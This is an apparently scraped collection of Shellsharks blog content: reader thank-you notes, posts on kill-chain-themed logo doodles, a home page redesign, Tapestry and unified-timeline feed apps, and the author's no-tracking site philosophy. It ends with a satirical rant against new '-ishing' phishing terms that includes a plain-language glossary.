for doing what you do‚Äîit genuinely sparked something for me. From Franklin (3/27/25) Wanted to write a quick note and say thank you for the time, effort, and thoughtfulness you put into the Vulnerability Management Bootcamp. I‚Äôve been trying to break into the security space for a few years now. I worked my way up from a desktop support intern to a senior analyst and earned a few certifications along the way‚Äîbut I never quite had the opportunity to pivot into a full-time security role. At times, I honestly questioned whether the field was just too saturated or if IT folks simply weren‚Äôt being given a shot in CyberSec. Then I came across your course. I took my time and went through it thoroughly in preparation for a Security Analyst interview with a Vulnerability Management team. The bootcamp gave me so much confidence heading into the interview and it also gave me so many things to talk about. Long story short, I was able to impress the panel and I just received a job offer today ‚Äì my first CyberSec role. I look forward to checking your content more and more. From Nakul (3/14/25) I came across your blog (Shellsharks) while I was browsing the web for cybersec resources I found it quite insightful. From Kai (3/7/25) also, your website is flipping awesome. Subscribed! Also, I might be stealing some ideas for my own site eventually üôà From Tyler (3/5/25) I‚Äôm Tyler, an infosec enthusiast working toward a career in the field. I came across your blog a month or so ago while researching inspiration for my own portfolio and blog. I loved the site theme and found your content incredibly interesting and engaging. On (3/5/25) For real, give @shellsharks@shellsharks. social a follow. Always good stuff. From Himanshu (3/4/25) ‚Ä¶Great work and I appreciate the work and the amount of effort you have taken to make one‚Ä¶ From Zak (3/3/25) Your website is absolute killer. You‚Äôve got the absolute knack for linking resources to relevant things, whilst keeping the momentum of the message you‚Äôre writing. I usually have CTRL held down as I read and click as I go. I always prepare myself for some rabbit-hole when your posts appear in my RSS feed. Your hyper(space)link travel post is an inspiration. I love a well-linked site so hopefully some others pick up the nudge too. I am meaning to do a similar post in the near future. From Phillip (2/28/25) love your scrolls newsletter üòç . Always so much to discover. From Moahmed (2/24/25) I just want to say your indie blog website, https://shellsharks. com, has been a big inspiration for me and has helped me gain a huge amount of insight. It inspired me so much, I actually made my own indie blog website. From Jeffrey (2/24/25) And your website is really cool, which must indicate that its owner is also really cool! I will add it to my indieroll ^_^ From John (2/20/25) I love this! Such a neat touch of personality. Bravo, Poseidon or Aquaman or somethin‚Äô. From John (2/18/25) as an aside, I continue to be enamoured with your site. Its such a clean design and layout, with a focus on text readability, along with having a fantastic wealth of information on it. I also love that it‚Äôs a static-generated site and not $blog_platform. I‚Äôve tried so many times to investigate static site generators, but could never close the gap between ease of use and ease of use and aesthetic. From Ishmael M. (2/18/25) Hi Michael! I‚Äôve been reading your Shellsharks blog posts and there are some great gems in there. It‚Äôs been great reading them. From Hedy (2/18/25) I love the design of your site, and even moreso the thorough overview of its architecture. You‚Äôve been added to the webring, welcome! From Arjun T. (2/18/25) Hello Michael, It feels honoured to be connected. I have no questions or the need to ask for advice from you. Just wanted to tell you, I am a huge fan of shellsharks. A huge fan. I have been checking out the site for a long time and only today I visited to about page and found you. From a reddit comment. I went ‚ÄúAHHH NO WAYYY! IT IS HIMM‚Äù Love your work. Keep doing it. Keep inspiring us. From Bob (2/13/25) I love it! I like how you‚Äôve ‚Äúsurfaced‚Äù recent posts, notes, etc. The old design is also great, but I think you‚Äôve taken it up a notch or two with this one. Nice work! From Eliezer G.

K. , and I currently work as a systems administrator for the University of Maryland‚Äôs helpdesk, a position I‚Äôve held for several years. I‚Äôm now exploring a transition into the vulnerability management and information security industry, and I wanted to express my sincere appreciation for the resources you‚Äôve shared in the VM Bootcamp and the Shell Sharks podcast. Your bootcamp content and podcast discussions have been an incredible guide as I consider this shift. I‚Äôm grateful for the clarity and depth you provide, which are especially valuable for someone new to the field. I did notice that the bootcamp was published in April 2021, and I‚Äôd love to hear if you feel the guidance you‚Äôve shared remains current or if there are updates or additional resources you‚Äôd recommend. Thank you again for your commitment to helping people like me enter this field with confidence. I look forward to any advice you may have! From James F.

First I want to thank you from the bottom of my heart, It is clearly the best ressource of threat modeling on the net. I want also to ask you if as you stated on the post, you plan to provide an example of your ID3 way to do threat model? It could be really helpful for me as I am doing threat modeling in my daily basis. Also if you have anything that details more your ID3 methodoloy, for example a more detailled scheme than the one on your blog I would really be interested. Many thanks in advance,Mehdi From Ayres N.

However, the Wireless Pentesting course in your write up sounds awesome. Great work on the blog! From Cameron S. (6/4/21) Nice website by the way. Just took a look at it. Sick desk setup haha " }, { "id": 38, "url": "https://shellsharks.com/shellsharks-doodles", "title": "Shellsharks Doodles", "body": "2025/02/18 - Similar to the Google Doodles, my site has its Shellsharks Doodles. They are celebrations of various events and holidays throughout the year, each designed by me using the Assembly app. Some of the doodles are merely thematic additions to the plain shellsharks logo, while others completely re-visualize the symbology throughout. These doodles go up and replace the classic doodle at the appropriate times throughout the year. Why did I design these? Just for fun I guess. Why these particular events/holidays? Well, I did what I could with the limited icon sets that were available within the Assembly app at the time. Will I make more doodles? I hadn‚Äôt thought about it for a while, but I can definitely see myself doing more in the future. The classic logo. Read more about it here. The New Years logo, basically the same as the classic logo, but with lotsa fireworks, some bottles poppin', a sign with the new year on it, and some fancy sharks with bowties. ü¶à ‚ãà üòÑ. The Valentines Day logo is also just the classic logo with a bunch of hearts and flowers added in various places. There are some easter eggs and li'l bonus things though. The weaponization circle has a love potion in the middle. For some reason I've put a planet that kinda looks like Venus (the roman goddess of love) in there (with the number '2' next to it as Venus is the second planet from the sun). I also pay homage to the classic ILOVEYOU virus in the exploitation and installation phases. Also looks like I changed the binary message around the outside of the logo, but honestly don't remember what it's supposed to say. A challenge for someone out there perhaps? üß° Here's a funny one, World Circus Day. Here things have gotten completely wacky, but you should appreciate that each of the inner circles still attempt to symbolize The Cyber Kill Chain. You've gotta use your imagination of course, but I'm sure you can kinda see what I was goin' for across each of the kill-chain steps. Notably we've got a cannon as the delivery mechanism and a magician pulling a rabbit out of a hat as the exploitation phase. There's also a Golden Ticket - wanna guess what that might be referencing? Everything else is, as you can plainly see, very circus-ey. Oh, and I've got swingin' monkey in there for good measure. üé™ üôà The Earth Day logo is a favorite of mine. It's again, just the classic logo, but with a lot of earth-ey stuff all over the place. Plants just growin' out from everything. My favorite part of this logo has got to be the great tree growing on the outside of the logo itself. üåé The Columbus Day logo is honestly one I haven't really used, but technically have around. Given the general controversy surrounding Columbus, and the holiday, it'll probably remain dormant. It's nothing but a few boats anyway. The Halloween logo is another very intricate, thematic design. Each smaller circle on the interior of the logo has been re-made in a spooky fashion. We've got zombies screaming BRAINS~!!! , witches flyin' every which way and plenty of ghouls and ghosties. But the best part? The scariest part? Is all the named vulns and their respective CVEs I've referenced in the exploitation and installation phases. Even better? Each of those named vulns are ones that have kinda spooky names too, e. g. Cable Haunt , ZombieLoad , Stagefright , Spectre , to name a few. There's a lot more in there too! Turns out vuln researchers like scary-sounding vuln names. üëª Last, but certainly not least, is the Christmas doodle. It's easily the one I'm the most proud of. I think I really nailed the Christmas-to-Kill-Chain symbology throughout, following Santa's journey to put presents under your tree. üéÖ üéÅ üéÑ Reconnaissance: First, Santa performs recon, reviewing his famed Naughty &amp; Nice list. Weaponization: Only so much I can do visually with exploitation , so here you get an assortment of random xmas-stuff and a particularly evil looking snowman. Delivery: The sleigh is loaded, and 8 tiny reindeer are ready to mount to the sky! Rudolph has even made his appearance. Exploitation: The chimney is Santa's favored exploitation vector. Installation: The gifts are then installed . C2: A new reindeer appears - On HAXXEN!! Actions on Objectives: Finally, Santa has delivered the presents, and he makes off with his favorite snack - a session-cookie! Merry Haxmas to All and to All a Good Night!! " }, { "id": 39, "url": "https://shellsharks.com/whats-a-home-page", "title": "What's A Home Page?", "body": "2025/02/13 - Every website you go to has a home page, the page you land on when you go to that site‚Äôs root domain, i. e. for Shellsharks, when you go to ‚Äúhttps://shellsharks. com‚Äù. Since 2021 my home page has had a very simple design - the logo, some link icons and the classic list of recent posts. In January of 2024 I simplified it even further, rearranging some graphics and removing the icons, filing them away in the site‚Äôs hamburger menu. More recently (~Februrary 2025), I got the itch to start tinkering with the site again and made a few further visual changes to the home page, opening up the feed to all content I write, not just posts, and adding some icons to differentiate the different content types. But, it still just wasn‚Äôt what I was looking for. I knew I wanted something else, but wasn‚Äôt sure what that something else is. So I went looking for inspiration. I found that in two of my favorite sites, Cory Dransfeldt &amp; Flamed Fury. Cory‚Äôs design has both a simplicity and cleanness to it, but also neatly showcases what he‚Äôs got goin‚Äô on across the site. I really enjoy his use of color as well. fLaMEd has an incredible home page splash graphic and an amazingly curated collection of stuff, made available right there on the home page. So I took some of their ideas, and shellsharks-ified them, incorporating those ideas into what is (for now) my new home page, behold! As I was building the new home page (and as I continue to do so), I‚Äôve asked myself, ‚Äúwhat is a home page?‚Äù What is it meant to do? What should it look like? What feeling do I want people to have when they go there? Where do I want them to go once they‚Äôre on my site? What do I want them to read? What‚Äôs important to me or to my readers? How do I want to use my site? The home page is a collection of opportunities and doors. My old home page was simple yes, and that was visually striking in a way that I‚Äôve always enjoyed, but it didn‚Äôt tell you much, and what it did show you, was pretty limited - just a list of stuff I had published recently. There was no story, and it effectively hid a lot of the other things on my site that you, the reader, might be interested in, stuff I am proud of. So the idea behind the redesign was to surface these things, introduce you to my site, showcase what I‚Äôve done recently and what I think you might want to see. I have a lot to offer, and have put in a lot of work, but only the real shellsharks spelunkers could have ever found it, digging around through the cavernous hamburger menu and web of hyperlinks throughout the site. It‚Äôs a work in progress, my site always is, IndieWeb sites just tend to be. That‚Äôs what‚Äôs fun! What‚Äôs great about this particular modular design is that I‚Äôm able to add new things, showcase more stuff when I feel like it. One big downside to the classic design (circa 2021) was that I never featured anything but my formal ‚Äúblog posts‚Äù. I talk about why I didn‚Äôt like that here. So I opened up the feed to everything, which introduced a new issue. Now, my best content was at risk of being buried in a way that I felt was a disservice. For example, I have a new Link Log where I share cool sites/blogs that I find, and I added those links to that home feed. But, I wasn‚Äôt incentivized to share a lot of links, because then my home page feed would‚Äôve been overrun with just links to other people‚Äôs stuff (cool as that stuff may be), effectively watering down my site to a degree and de-emphasizing all the other stuff on my site. The new design allows me to share as many links as I want, without overshadowing everything else. Awesome! So yeah, the new home page is live, and I think it‚Äôs great. I‚Äôd love to hear about your home page, or home pages of sites that you love (so I can get more inspo), or thoughts that you have about my new home page, hit me up anytime! (Also, I‚Äôve kept my classic home page available as the ‚Äúhome feed‚Äù. ) " }, { "id": 40, "url": "https://shellsharks.com/tapestry-has-found-its-place", "title": "Tapestry Has Found its Place", "body": "2025/02/10 - A few days ago I confidently stated that ‚Äúunified timelines are not for me‚Äù, but I think I may have been a bit too hasty in that declaration. I‚Äôve been tinkering around with Tapestry for a few days now, trying to find a way to fit it into my daily feed ingestion workflow and I think I‚Äôm starting to discover its niche for me. This doesn‚Äôt really change what I said in that previous post, Tapestry is not a good (main) RSS reader, especially (again) when you weave together RSS feeds and social timelines (for the reasons I state in the article). Secondarily, Tapestry isn‚Äôt a great RSS reader (right now) as it struggles mightily when faced with simultaneously updating 100‚Äôs of disparate feeds, which my current RSS app (Reeder) does without breaking a sweat. In time, that performance issue may improve, but the former issue won‚Äôt. But let‚Äôs not dwell on what I don‚Äôt use Tapestry for, let‚Äôs instead talk about what I think it can be good at, and what I‚Äôve started using it for over the past couple days. I spent a long while yammering on about signal-to-noise ratio and fidelity as it relates to my ‚Äúfeeds‚Äù last time I wrote about unified timelines. There, I made the case for why mushing together my RSS feeds with (as an example) a social feed didn‚Äôt make sense, and I stand by that. I want to keep my RSS feeds in an RSS app, because they are the ‚Äúhighest-fidelity‚Äù feed and shouldn‚Äôt be paired with mid or low-fidelity-type feeds. Similarly. my Mastodon/Fediverse feeds need to be kept in their own app. But what about everything else? Here‚Äôs where Tapestry has found it‚Äôs niche for me. You see when it comes to RSS, I scroll through &amp; consider every post in that feed. It is highly curated afterall and there‚Äôs a decent likelihood im interested in anything/everything that shows up there. For my Fedi feeds, they are also highly curated, but more prone to ‚Ä¶ let‚Äôs call it ‚Äúsilliness‚Äù, so I tend to scroll a bit faster through that feed and don‚Äôt necessarily stop to really read and consider each post. After that what is there? There are a collection of ‚Äúfeeds‚Äù that I will, only look at occasionally, are high volume / low signal-to-noise, or are *‚Äúdiscovery-oriented‚Äù, in which I mean things I peruse to discover new stuff that might be of interest to me. This is the third degree of fidelity, and for those odd collection of feeds, Tapestry is actually quite a nice vehicle to consume them. Feed Fidelity Continuum Tier 1: RSS Tier 2: Mastodon / Fediverse (non-algorithmic social feeds) Tier 3: Other (e. g. Bluesky, Reddit, Discovery RSS*, Lemmy/Thrediverse, etc‚Ä¶)Let‚Äôs talk about what makes Tapestry a great reader/timeline app for these ‚Äòlow-fidelity‚Äô (Tier 3) feeds. First, (before talking about the things Tapestry is great at) I want to reiterate that in my usage of Tapestry, it really struggled to import and then consistently refresh a large volume of RSS feeds. At first, I tried to import close to 2500 feeds into Tapestry and it simply would not do it. After that, I pared down the list and finally got about 500 feeds imported. The app would skitter and completely time out trying to refresh all those feeds. Contrast that with my Reeder app, purpose-built for RSS, which can ingest and handle 1000‚Äôs of feeds with no issue. So, if you have a high volume of RSS feeds, Tapesty isn‚Äôt for you right now, especially as a pure RSS app (not considering the issues I talked about before in terms of unifying RSS and other types of feeds. ) For social feeds, especially those that you want to actually engage with, Tapestry also isn‚Äôt ideal, as you completely lose all those capabilities to natively like/heart, reply, boost/repost, etc‚Ä¶ You need to bounce out of the Tapestry app into the respective app/client for that social platform to do those things. But! What if you had a social feed that you wanted to follow, but wasn‚Äôt something you engaged with frequently. Then, Tapestry might work pretty well for that. This is the case for me with Bluesky. I have a Bluesky account, and I follow some folks there that do not have presences elsewhere. Because I want to see what they have to say, and I want to limit the amount of time I spend ‚Äúengaging‚Äù there, Tapestry is a great place for me to mostly-read-only-mode my Bluesky feed. On the rare occasion I see something I really want to interact with on Bluesky, it‚Äôs easy enough to bounce out and do that. This is equally true for pretty much all the feeds I have loaded into Tapestry, it is entirely made up of things that I might want to quickly peruse, but probably won‚Äôt want to engage with. Scrolling through gobs of stuff that might include something I‚Äôm interested in can be, at times, not the most enjoyable or worthwile scroll. But, Tapestry softens the blow because the app is gorgeous. Looking back at my fidelity tiers, you‚Äôve got RSS at 1, Fedi at 2, and everything else at 3. From a client perspective, this makes tier 1 and tier 2 pretty simple/obvious. You have an RSS app for 1 and a Fedi client (that supports more than just Mastodon) for 2. But for the third tier, ‚ÄúOther‚Äù, you need something that can natively ingest a wide variety of feeds, some of which may be kinda niche. Tapestry is not only built to do this out-of-the-box (as it is a unified timeline app), but it also ships with a powerful, extendable, connectors system by which you can load in (or develop your own) third-party connectors. This will make browsing feeds from all over the place uniquely possible. In this story, Tapestry is being used to ingest, weave-together and view a wide variety of eclectic feeds, all of which are ‚Äúlower signal-to-noise‚Äù. This could mean the timeline balloons beyond what you may feel like scrolling through on any given day. To help handle the firehose, Tapestry also ships with a powerful set of features for muffling, muting and building custom timelines. So, that‚Äôs how I‚Äôve been using Tapestry. It looks great, performs well for what I am now using it for and has even earned a coveted spot on my phone home screen. I‚Äôve also seen a number of connectors being shared by the community too to further extend its capabilities which is awesome! Let me know what you think though! Especially for those of you who agreed with my original assessment. Do you think Tapestry (or other unified timeline apps) could have a place in your workflow? Or are you a normal person and don‚Äôt feel the need to keep up with every feed that‚Äôs of even mild interest to you?

The sitemap helps inform search engine crawlers what on your site you want indexed. Conversely, you‚Äôll want the robots. txt file to instruct those same crawlers what pages they should avoid. Though it isn‚Äôt required, I would suggest creating a ‚Äúblog‚Äù too, where you can publish stuff you want to write about/share with any current/future readership. If you do decide to blog, be sure to also create an RSS feed so that people can subscribe to your content!

Notably Reeder (not to be confused with Reeder Classic), Tapestry &amp; Surf. Though these apps differ in many ways, they have these core commonalities‚Ä¶ They support mixed-content/heterogenous feeds (e. g. podcasts, YouTube, Mastodon, Pixelfed, Bluesky, Glass, Flickr, Reddit, RSS, Tumblr and more) All feeds are woven together in a unified, chronological timeline with some form of timeline sync rather than unread counts typical of your classic RSS feed readers They also support the ability to create custom feeds, timelines and filtersCool right? This sounds useful. I can reduce the amount of apps I‚Äôm opening all the time and do a better job not missing things, yeah? In theory. But in practice, I have found that these apps, cool as they are, just don‚Äôt give me what I want and need. Let me explain why‚Ä¶ Curation &amp; completionism: RSS feeds are highly curated and high fidelity/signal-to-noise. What I mean by that, is you subscribe to what you want, and you get nothing else. I also think that generally, people‚Äôs list of RSS feeds is smaller and more highly curated than their social media follows (as an example). Non-algorithmic social feeds (i. e. Mastodon / Fediverse platforms) are still (generally) highly curated (at least for me), but lower signal-to-noise courtesy of the nature of social media/micro-blogging. You get a lot more casual posts, short-form stuff, shitposts, and of course boosts/reposts, all of which add more noise to the feed. This means that when juxtaposed in a unified timeline, you lose the fidelity of your RSS feeds, by combining it with the higher noise feed of your social media timeline. You continue to lose fidelity as you add even noisier feeds (i. e. Reddit, Tumblr, or algorithmic timelines). Social functionality: When you scroll a social feed, there are a lot of little interactions you may want to perform. Namely ‚Äústars‚Äù and ‚Äúboosts‚Äù (to use the Mastodon lexicon). In order to do those things while browsing a unified feed app however, you would have to jump out of the unified timeline/app into the respective app, which adds a lot of overhead, especially if you‚Äôre someone like me who tends to like/repost a lot of stuff. You may also want to follow an account, mute something, search for something in-app, add something to a list, etc‚Ä¶ There‚Äôs lots of functionality you just lose by not being in the app that supports the actual service you‚Äôre browsing. Volumetric imbalance: I touched on this earlier. Let‚Äôs say you don‚Äôt open your RSS app for a day, depending on how many feeds you have subscribed to, you‚Äôll get maybe 10‚Äôs of new items. In a social media app though? Hundreds. When combined in a unified timeline, blog posts, which again are meant to be kinda higher signal, are drowned in a sea of microblog shitposts. Similar story with something like Reddit. Mindset: Do you really want to browse Reddit threads at the same time you‚Äôre catching up on the blogs you subscribe to? Do you want to scroll through people‚Äôs social media shitposts at the same time you‚Äôre seeing what new podcasts there are? This is of course very subjective, but there‚Äôs something to it. I think I just tend to be a in mood for a particular type of content, and by mushing them all together, it‚Äôs a bit of a rollercoaster. Now these unified timeline apps do have the ability to switch your feed/custom timeline view, but how does that then work with the timeline sync? If I switch from the unified view to just scroll through my latest YouTube items, what happens when I re-enable the unified timeline at a point in time further back then I had made it in my filtered YT timeline? Are those repopulated in the universal timeline and I have to scroll past them again? Are they intelligently filtered out? It gets a bit complicated. Native functionality: In a unified timeline app, you just lose out on native functionality of the client or the overall platform. For Mastodon, you can‚Äôt like, boost, or comment. For Bluesky, you can‚Äôt leverage the algorithmic feed or see notifications. For Reddit, you can‚Äôt browse other non-subscribed subreddits, look at messages, etc‚Ä¶ You get a watered down experience of all these services. This said, one way to use a unified timeline app in partnership with a native client would be to scroll through the unified timeline, save/bookmark things you want to interact with, and then go through your saves and systematically interact as you had wanted, and then unsave/unbookmark as you complete each interaction. This could probably work for me, but the problem remains that I just tend to scroll faster through a social feed than I would my blog feed. This goes back to the curation/signal problem. How much do you care about each individual feed. You‚Äôre probably perfectly willing to miss something in a Reddit sub, but less willing to miss something in your RSS feed or even Mastodon/Fediverse feed. Another way I suppose I could use an app like this is to not used the unified timeline at all, but since all my feeds are supported in-app, I can just scroll each individual feed independently, yet all through the same app. But if I‚Äôm doing that, why not just jump into the apps themselves where I don‚Äôt lose functionality? Any time I save by staying in one app, I lose because I‚Äôll likely need to jump out of the universal timeline app to interact with things in the respective native apps. I really want to like these apps (In fact, I was a Project Tapestry Kickstarter supporter), and I think an app like Surf stands out because it not only has unified timeline stuff, but it has real powerful search and discovery functionality. Don‚Äôt get me wrong, these apps look great (Tapestry is BEAUTIFUL), but they just aren‚Äôt for me - not for the way I use and browse my feeds on a daily basis. To be fair it‚Äôs early days for these apps, and I suspect a lot of new functionality will be added over time. So I will keep my eye on them and continue trying them out as they evolve! So I still encourage you to just get an RSS app, but hey, I‚Äôm interested in hearing your story about how this does work for ya. It might not be my cup of tea (yet), but that doesn‚Äôt mean it won‚Äôt be yours! Other Stuff: Using Tapestry or Reeder as a Bluesky app is actually a pretty good idea since it gives you one really awesome feature that you can‚Äôt get with the native app - timeline position sync.

Are there other annoying things that I encounter on the web that my site doesn‚Äôt do? Are there, *gulp*, things my site does that are annoying? DISCLAIMER: I've stolen some of the things from Rachel's list and added them to my own. All credit to her for this amazing original rant though!Annoying things my site doesn‚Äôt doI don‚Äôt track engagement in any way. No click counter, no Google analytics, nada. Honestly, I‚Äôm just not interested in it. My site isn‚Äôt monetized, and I don‚Äôt want to obsess over what pieces do well or how many people clicked, or are subscribed, or w/e. I write because it‚Äôs fun and I enjoy engaging with those who message me about something I‚Äôve written. Easy. I don‚Äôt have ads of any kind. Again, I don‚Äôt monetize the site. My site is first and foremost a resource for myself. To junk it up with a bunch of ads would be counter to this mission. I‚Äôll never have ads. That simple. I don‚Äôt set cookies. So I have no GDPR-induced privacy pop-up you have to accept or any other cookie-related advisory notices. I actually value your privacy, and do so by not wanting to know anything about you. That is unless you want to reach out to me and chat! Then I‚Äôd love to get to know ya üòÑ. I don‚Äôt track IPs. My site is hosted off GitHub Pages, and as such, I can‚Äôt even get this information. Even if I could though, I wouldn‚Äôt look at server logs because I just don‚Äôt care. I don‚Äôt do popups. You won‚Äôt have to make any privacy concessions, nothing is going to pop up and ask you to give me money or subscribe, you can just scroll and click in peace. I don‚Äôt abuse animations. I actually do have a few things animated within my site. There‚Äôs one page (I won‚Äôt tell you which), where the sharks in my footer will circle when you hover over them. I also have a small few indieweb-related sites that have some 88x31 oldweb-style buttons, some of which animate. Oh, and yeah, my title image has a blinking underscore, but that‚Äôs cool right? I don‚Äôt have any autoplaying audio or video. Actually, don‚Äôt think I have any audio or video at all. Problem solved. I don‚Äôt try to ‚Äúgrab you‚Äù when you back out of a page, saying something like ‚Äúbefore you go, check out this other thing‚Äù. That‚Äôd be really annoying. I don‚Äôt hide or otherwise not include publish dates for blogs. In fact, I have ‚Äòpublished‚Äô and ‚Äòupdated‚Äô dates for all my content. I don‚Äôt have elements which follow you down the page as you scroll. I don‚Äôt have any content across pages which begs you to support me or follow me or subscribe or w/e. I do no scroll-hijacking or tamper with how your browser has implemented scrolling. No silly ‚Äúprogress bar‚Äù which animates as you scroll up and down a page. I don‚Äôt junk up my pages with icons that claim to be for ‚Äúsharing‚Äù or ‚Äúliking‚Äù a post. I don‚Äôt do any dynamic page loading as you scroll down. I don‚Äôt have pages with infinite scroll. The page you wanted to see is what you see, nothing else. I have very reasonable pagination for my various post streams. I don‚Äôt put vacuous and misleading clickbait ‚Äúyou may be interested in‚Ä¶‚Äù boxes at the bottom of my posts. My site is not monetized, so I don‚Äôt make any money just because you go anywhere on my site. I don‚Äôt have anything like that annoying Substack page that asks you to subscribe before redirecting you to the actual page you wanted to see. I don‚Äôt not have a dark mode theme. I don‚Äôt not have an RSS feed. Nothing on my site will ask you to enable notifications in your browser, I don‚Äôt ask to send you notifications of any kind. My site doesn‚Äôt need your email. I don‚Äôt ask for your location. I don‚Äôt shift things on your screen annoyingly, causing you to mis-click links. I don‚Äôt muddy my content pages with comments, or awful Disqus forums. I don‚Äôt ask you to make an account of any kind. I don‚Äôt have any paywalled or account-walled content. I don‚Äôt optimize for SEO. Not saying I won‚Äôt try a fun, slightly click-baitey post title every once in a while, but it‚Äôs certainly not done to get better search rankings. I don‚Äôt have gobs of third-party dependencies. What third-parties I do use I try to expose here. I don‚Äôt have any janky photo carousels. In fact I keep photos sorta to a minimum on the site. I don‚Äôt aggressively limit column width for content on large displays. If you got a beautiful, glorious, gigantic, wide-screen monitor and for some unearthly reason wanted to open my site in full-screen mode, you‚Äôll have SUPER wide content to enjoy. I don‚Äôt do relative dates for posts. It‚Äôs all about them absolute dates. No date math required! I don‚Äôt have any huge banners or images on content pages. I have some larger graphics like my home page logo, but even that is relatively tame. I don‚Äôt hide my contact information. Wanna find me on the web? It‚Äôs all pretty easy to find. Annoying things I (unfortunately?) do: Some things I do on my site you might actually find kinda annoying. Sorry about that. I‚Äôd like to find a way to stop doing those things or mitigate them to an extent in the future‚Ä¶ I do kinda require JavaScript for the site to look normal. Technically you can read posts without JS‚Ä¶but some stuff will certainly be wonky. One day I‚Äôd like to look into how I can make my site play nicely for those with JS tunred off‚Ä¶ I do have all sorts of images without ALTs. In fact, I have a lot of accessibility stuff I desperately need to put time into fixing. Sorry! I do load some things from other origins (Pictures, some scripts, etc‚Ä¶). You can read about those suppliers here. What are some other annoying things websites do? Does my site do them? Feel free to let me know, I probably want to fix it, and have it not do that thing. Thanks! " }, { "id": 45, "url": "https://shellsharks.com/no-more-ishings", "title": "No More -ishings!", "body": "2025/02/04 - *Takes a breath. * STOP. Please. Just stop. No more. We as a community (the infosec community) must band together and collectively agree to stop creating new phishing name variants. It‚Äôs gone too far. There‚Äôs too many! Won‚Äôt someone think of the aspiring CISSPs? In addition to cramming fire suppression factoids and bollard types into their heads, they will also need to memorize every god forsaken -ishing term too. Back in my day you had just a few, e. g. phishing, vishing, spear phishing, whaling, blah blah - and this was still way too many. What‚Äôs with us infosec folks? Why do we do this to ourselves? (Theory: self-loathing, it actually explains a lot about infosec practitioners really). But it was the way it was, and I never complained. But then, a few years ago, Coinbase dropped their infamous QR Code Super Bowl ad and every single infosec influencer and security vendor had a ‚ÄúQuishing‚Äù article out within 24 hours. Ugh. I distinctly remember complaining about this a few years ago, but I ultimately let it go. But today, I came across this extremely cursed blog post from Zimperium, titled ‚ÄúHidden in Plain Sight: PDF Mishing Attack‚Äù. No! *whacks Zimperium blogger with rolled-up newspaper* - STOP. First of all, this wasn‚Äôt even their first usage of the ‚Äúterm‚Äù (know that I‚Äôm using those quotes very sarcastically) Mishing. To understand it, you have to go back to this post where they explain that mishing is some sort of composite form of phishing which includes a bunch of other established phishing variants (e. g. vishing, smishing, quishing, etc‚Ä¶) What? So it isn‚Äôt even its own thing? Why does this need to exist? Let me answer that. It doesn‚Äôt. It shouldn‚Äôt. What‚Äôs wrong with just using a descriptive, distinct word as a prefix for different types of phishing variants? Y‚Äôknow, like ‚ÄúSpear Phishing‚Äù. There are plenty of other examples of how we‚Äôve done this in sane way, e. g. Angler phishing, Clone Phishing, double-barrel phishing, Deepfake phishing, search engine phishing, etc‚Ä¶ Now granted, I don‚Äôt love these either, but imagine if those who had coined these terms had instead gone with things like (respectively) ‚Äúangishing‚Äù, or ‚Äúclishing‚Äù, or ‚Äúdubba-ishing‚Äù, or ‚Äúdeepishing‚Äú‚Ä¶ *shudders*. You see how ridiculous that sounds? I‚Äôd even settle for coming up with a completely new term, like what we did with ‚ÄúWhaling‚Äù or Pharming. At least there‚Äôs some points for creativity. But no, Zimperium thought they could play God, and breathe life into this abomination. Look, I think coming up with funny names for stuff is great. I mean I‚Äôve been documenting named vulnerabilities for over 5 years now and will continue to do so. It‚Äôs whimsical and fun. Name every vuln for all I care. As for the -ishings though?‚Ä¶ I won‚Äôt stand for it. I‚Äôm going to use my platform, and what influence I have (and I can‚Äôt emphasize enough how little that probably is), to stir collective action. No more -ishings. We must band together. Take the pledge, sign the petition (yes, this is a real and totally not satirical petition on change. org), get the word out, don‚Äôt breathe further life into these terms, don‚Äôt legitimize them in any way. I call them out here only to shame them and the would-be influencers-turned-pariahs who were responsible for their creation. I hope you‚Äôll join me. Because if we don‚Äôt do something now. Who knows what the future will look like. Think you have it hard now with all the terms and acronyms you have to remember? It could be a lot worse. All this said, you might be unfortunate enough to have to remember what all these terms mean. For that, you can look at my very cursed Glossary of -ishings. God speed. Glossary of -ishingsDon‚Äôt know what the hell ‚ÄúMishing‚Äù is? Don‚Äôt worry, no one should have to. But here you are anyway. Learn what allllllllll the different -ishings are below‚Ä¶ First though, to understand all derivatives, let‚Äôs define regular-ol‚Äô ‚ÄúPhishing‚Äù. I‚Äôm just going to use Wikipedia‚Äôs definition for Phishing here as I think it sums it up nicely enough. Phishing is a form of social engineering and a scam where attackers deceive people into revealing sensitive information or installing malware such as viruses, worms, adware, or ransomware. Good. Now, the -ishings‚Ä¶ ‚ÄúVishing‚Äù: Phishing using your voice. So like, over the phone as an example. Seems like we could have just left this as ‚ÄúVoice Phishing‚Äù. ‚ÄúSMiShing‚Äù: Phishing through text messages. Notice how officially this term has capitalized the first ‚ÄòS‚Äô, the ‚ÄòM‚Äô and the second ‚ÄòS‚Äô so that it spells out ‚ÄúSMS‚Äù. I bet whoever came up with that was real proud of themselves. Lame. Oh and yeah, seems like we could have just called this ‚ÄúSMS Phishing‚Äù. ‚ÄúQuishing‚Äù: Phishing with QR codes. Put a QR code on something, people just run around scanning QR codes all the time right? Unaware, they are teleported off to a malicious website or whatever. JUST CALL IT QR PHISHING. Jeez. ‚ÄúMishing‚Äù: ‚ÄúMobile-targeted‚Äù phishing (according to Zimperium). Just go look at the link, as it explains it better than I honestly care to do here. I‚Äôve made my feelings quite clear about this particular term. I will say no more. To finish this off, I‚Äôll drop some quick definitions for the other -ishing-adjacent terms‚Ä¶ ‚ÄúSpear Phishing‚Äù: A phishing campaign that is highly targeted at a single person or group. ‚ÄúWhaling‚Äù: A spear phishing variant aimed exclusively at high-level executives or important officials. ‚ÄúAngler phishing‚Äù: Phishing targeting users‚Äô social media accounts. ‚ÄúClone Phishing‚Äù: A type of email phishing where the malicious actor imitates (‚Äúclones‚Äù) emails from authorized senders. ‚ÄúDouble-barrel phishing‚Äù: Sending two separate emails to a victim to establish trust and lend authenticity. ‚ÄúDeepfake phishing‚Äù: Leveraging deepfakes to phish someone. Basically deepfaking your voice, writing style, visage, etc‚Ä¶ ‚ÄúSearch engine phishing‚Äù: i. e. SEO poisoning, is where a malicious actor coerces a search engine to elevate a malicious phishing link in search engine results. ‚ÄúPharming‚Äù: Hijacking DNS to redirect users to a malicious site. (Seems kinda similar to DNS spoofing/poisoning etc no?)Know of another -ishing term I haven‚Äôt captured here? KEEP IT TO YOURSELF. I really don‚Äôt want to know about any more. Hopefully I was able to adequately channel my inner-CrankySec. Sorry you had to read this!

